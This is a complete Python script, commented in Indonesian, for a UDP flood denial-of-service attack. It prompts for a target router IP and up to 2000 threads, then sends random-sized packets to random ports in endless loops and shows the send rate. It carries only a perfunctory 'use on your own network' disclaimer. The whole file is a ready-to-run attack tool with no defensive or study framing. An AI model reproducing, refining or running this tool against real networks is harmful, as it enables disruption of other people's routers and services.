import socket
import threading
import time
import sys
import random

# ==============================================================================
# Variabel Global dan Definisi Warna untuk Terminal
# ==============================================================================

# Variabel untuk menghitung statistik serangan
paket_terkirim = 0
# Lock untuk sinkronisasi thread agar tidak terjadi bentrokan saat update counter
lock = threading.Lock()

# Kode warna ANSI untuk mempercantik output
MERAH = '\033[91m'
HIJAU = '\033[92m'
KUNING = '\033[93m'
BIRU = '\033[94m'
CYAN = '\033[96m'
PUTIH = '\033[97m'
RESET = '\033[0m'  # Mengembalikan warna ke default
TEBAL = '\033[1m'

# ==============================================================================
# Fungsi-Fungsi Utama
# ==============================================================================

def display_banner():
    """Menampilkan banner program dengan warna."""
    # Menggunakan raw f-string (rf"...") untuk menghindari SyntaxWarning dan memasukkan variabel warna
    banner = rf"""
{CYAN}╔═════════════════════════════════════════════════════════════════╗{RESET}
{CYAN}║{RESET}  {TEBAL}{MERAH} _____    ____   ____  _____  ______  _      __      ___  __  _{RESET} {CYAN}║{RESET}
{CYAN}║{RESET}  {TEBAL}{MERAH}|  __ \  / __ \ / __ \|  __ \|  ____|| |     \ \    / / |/ / | | {RESET} {CYAN}║{RESET}
{CYAN}║{RESET}  {TEBAL}{MERAH}| |  | || |  | | |  | | |__) | |__   | |      \ \  / /| ' /  | | {RESET} {CYAN}║{RESET}
{CYAN}║{RESET}  {TEBAL}{MERAH}| |  | || |  | | |  | |  _  /|  __|  | |       \ \/ / |  <   |_| {RESET} {CYAN}║{RESET}
{CYAN}║{RESET}  {TEBAL}{MERAH}| |__| || |__| | |__| | | \ \| |____ | |____    \  /  | . \   _  {RESET} {CYAN}║{RESET}
{CYAN}║{RESET}  {TEBAL}{MERAH}|_____/  \____/ \____/|_|  \_|______||______|    \/   |_|\_\ |_| {RESET} {CYAN}║{RESET}
{CYAN}║{RESET}                                                                {CYAN}║{RESET}
{CYAN}║{RESET}{KUNING}                      --<< by ALRSSYD_ >>--                      {CYAN}║{RESET}
{CYAN}╚═════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

def get_gateway_ip():
    """Meminta IP Gateway dari pengguna dengan validasi."""
    try:
        prompt = f"{KUNING}[?] Masukkan IP Gateway (Router) target (cth: 192.168.1.1):{RESET} "
        gateway_ip = input(prompt)
        socket.inet_aton(gateway_ip)  # Cek apakah format IP valid
        return gateway_ip
    except socket.error:
        print(f"{MERAH}[!] Format IP tidak valid. Program berhenti.{RESET}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{KUNING}[!] Program dihentikan oleh pengguna.{RESET}")
        sys.exit(0)

def udp_flood(target_ip):
    """Fungsi worker yang akan dijalankan oleh setiap thread."""
    global paket_terkirim
    # Membuat socket UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Membuat paket data acak dengan ukuran bervariasi (1KB - 4KB)
    data = b'x' * random.randint(1024, 4096)
    
    while True:
        try:
            # Kirim paket ke port acak (1 s/d 65535) untuk efektivitas lebih tinggi
            port = random.randint(1, 65535)
            client.sendto(data, (target_ip, port))
            
            # Mengunci thread sebelum mengubah variabel global
            with lock:
                paket_terkirim += 1
        except Exception:
            # Jika ada error, cukup lewati dan lanjutkan loop
            pass

def print_status():
    """Menampilkan status serangan secara real-time."""
    global paket_terkirim
    start_time = time.time()
    
    while True:
        time.sleep(1) # Update status setiap 1 detik
        duration = time.time() - start_time
        if duration == 0: duration = 1 # Hindari pembagian dengan nol
        
        with lock:
            pps = paket_terkirim / duration # Hitung paket per detik
        
        # Cetak status di baris yang sama. `\r` membawa kursor ke awal baris.
        status_text = f"{HIJAU}[*] Paket Terkirim: {PUTIH}{paket_terkirim}{HIJAU} | Kecepatan: {PUTIH}{pps:.2f} PPS{RESET}"
        print(f"\r{status_text}", end="")

def main():
    """Fungsi utama untuk mengorkestrasi serangan."""
    display_banner()
    
    print(f"{MERAH}{TEBAL}[!] PERINGATAN: Gunakan hanya pada jaringan Anda sendiri untuk tujuan pengujian.")
    print(f"[!] Penggunaan ilegal adalah tanggung jawab Anda sendiri.{RESET}\n")
    
    target_ip = get_gateway_ip()
    
    try:
        prompt = f"{KUNING}[?] Masukkan tingkat 'kerakusan' (1-2000, default 500):{RESET} "
        thread_count_str = input(prompt)
        thread_count = int(thread_count_str) if thread_count_str else 500
    except ValueError:
        print(f"{KUNING}[!] Input tidak valid, menggunakan default 500.{RESET}")
        thread_count = 500

    print(f"\n{HIJAU}[*] Menargetkan router di {PUTIH}{target_ip}{RESET}")
    print(f"{HIJAU}[*] Melancarkan serangan dengan {PUTIH}{thread_count}{HIJAU} pekerja...{RESET}")
    print(f"{KUNING}[*] Tekan {TEBAL}CTRL + C{RESET}{KUNING} untuk berhenti.{RESET}")
    
    # Thread untuk menampilkan status
    status_thread = threading.Thread(target=print_status)
    status_thread.daemon = True # Agar thread mati saat program utama berhenti
    status_thread.start()

    # Membuat dan memulai thread pekerja
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=udp_flood, args=(target_ip,))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Menjaga program utama tetap berjalan sampai dihentikan
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{MERAH}[+] Serangan dihentikan.{RESET} {HIJAU}Router akan kembali normal.{RESET}")
        sys.exit(0)

# ==============================================================================
# Titik Masuk Program
# ==============================================================================
if __name__ == "__main__":
    main()